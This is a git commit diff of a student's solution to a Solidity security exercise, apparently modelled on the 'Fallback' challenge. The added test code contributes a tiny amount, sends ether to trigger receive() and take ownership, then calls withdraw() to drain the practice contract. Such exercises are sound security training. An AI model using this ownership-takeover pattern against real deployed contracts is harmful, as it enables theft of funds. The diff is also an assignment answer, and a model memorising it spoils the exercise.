546e00eaef3522dd1956b46bec489ce5fdbe3876
NaderQuwatli <nader.battle98@gmail.com>
2025-04-09 20:14:02 +0300

    ass11 completed

--- test/Assignment11.sol
+++ test/Assignment11.sol
@@ -18,10 +18,15 @@ contract FallbackTest is Test {
         vm.startPrank(student);
         
         // Contribute a small amount (less than 0.001 ether) to the contract
-
+        fallbackContract.contribute{value: 100000000000 }();
+        
         // Send ether to the contract trigger receive() and become the owner
-
+        (bool success, ) = address(fallbackContract).call{value: 100000}("");
+        require(success, "ether transfert failed") ;
+        
         // Withdraw all funds
+        fallbackContract.withdraw() ; 
+
 
         vm.stopPrank();
     }
@@ -32,7 +37,7 @@ contract FallbackTest is Test {
         verifySolution();
     }
 
-    function verifySolution() internal {
+    function verifySolution() internal view {
         assertEq(fallbackContract.owner(), student, "Ownership not transferred");
         assertEq(address(fallbackContract).balance, 0, "Contract balance not drained");
     }
